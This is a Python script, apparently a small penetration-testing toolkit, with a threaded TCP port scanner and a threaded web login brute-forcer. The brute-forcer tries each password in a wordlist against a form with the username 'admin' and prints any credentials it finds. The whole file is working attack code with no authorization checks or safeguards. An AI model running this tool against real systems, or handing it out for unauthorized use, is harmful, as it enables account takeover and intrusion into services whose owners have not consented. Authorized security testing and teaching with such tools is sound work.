import socket
import requests
import sys
import threading
import collections
import time
import itertools # For password combinations

class PenetrationToolkit:
    def __init__(self):
        pass

    def run_port_scanner(self, target_host, start_port, end_port):
        print(f"[*] Starting Port Scan for {target_host} from port {start_port} to {end_port}")
        open_ports = []
        
        def scan_port(port):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5)
                result = s.connect_ex((target_host, port))
                if result == 0:
                    open_ports.append(port)
                    print(f"  [+] Port {port} is open")
                s.close()
            except socket.error as e:
                pass # Ignore connection errors

        threads = []
        for port in range(start_port, end_port + 1):
            thread = threading.Thread(target=scan_port, args=(port,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()
        
        print(f"[*] Port Scan Complete for {target_host}. Open Ports: {sorted(open_ports)}")
        return open_ports

    def run_web_bruteforce(self, target_url, username_field, password_field, wordlist_file, success_indicator="Welcome", max_threads=10):
        print(f"[*] Starting Web Brute-Force for {target_url}...")
        
        found_credentials = None
        
        try:
            with open(wordlist_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Error: Wordlist file '{wordlist_file}' not found.")
            return

        print(f"[*] Loaded {len(passwords)} passwords from '{wordlist_file}'")

        queue = collections.deque(passwords)
        lock = threading.Lock()
        
        def attempt_login():
            nonlocal found_credentials
            while queue and found_credentials is None:
                with lock:
                    if not queue:
                        break
                    password = queue.popleft()

                sys.stdout.write(f"\r  Trying password: {password:<20}")
                sys.stdout.flush()

                data = {
                    username_field: "admin", # Assuming 'admin' as a common username for brute-forcing
                    password_field: password
                }
                
                try:
                    response = requests.post(target_url, data=data, timeout=5)
                    if success_indicator in response.text:
                        with lock:
                            if found_credentials is None: # Ensure only the first one is captured
                                found_credentials = {"username": "admin", "password": password}
                                print(f"\n[+] Credentials found! Username: admin, Password: {password}")
                                # Empty the queue to stop other threads
                                queue.clear() 
                        break # Exit the loop if credentials found
                except requests.exceptions.RequestException as e:
                    pass # Ignore connection errors, move to next password
                
        threads = []
        for _ in range(min(max_threads, len(passwords))):
            thread = threading.Thread(target=attempt_login)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        if found_credentials:
            print(f"[*] Brute-Force Complete. Found: {found_credentials['username']}:{found_credentials['password']}")
        else:
            print(f"\n[-] Brute-Force Complete. No credentials found for 'admin'.")
        
        return found_credentials

if __name__ == "__main__":
    toolkit = PenetrationToolkit()

    if len(sys.argv) < 2:
        print("Usage: python toolkit.py <module_name> [args]")
        print("Modules:")
        print("  portscan <host> <start_port> <end_port>")
        print("  bruteforce <url> <username_field_name> <password_field_name> <wordlist_file>")
        sys.exit(1)

    module_name = sys.argv[1].lower()

    if module_name == "portscan":
        if len(sys.argv) != 5:
            print("Usage: python toolkit.py portscan <host> <start_port> <end_port>")
            sys.exit(1)
        host = sys.argv[2]
        start_port = int(sys.argv[3])
        end_port = int(sys.argv[4])
        toolkit.run_port_scanner(host, start_port, end_port)
    elif module_name == "bruteforce":
        if len(sys.argv) != 6:
            print("Usage: python toolkit.py bruteforce <url> <username_field_name> <password_field_name> <wordlist_file>")
            sys.exit(1)
        target_url = sys.argv[2]
        username_field = sys.argv[3]
        password_field = sys.argv[4]
        wordlist_file = sys.argv[5]
        toolkit.run_web_bruteforce(target_url, username_field, password_field, wordlist_file)
    else:
        print(f"[-] Unknown module: {module_name}")
        print("Available modules: portscan, bruteforce")
        sys.exit(1)
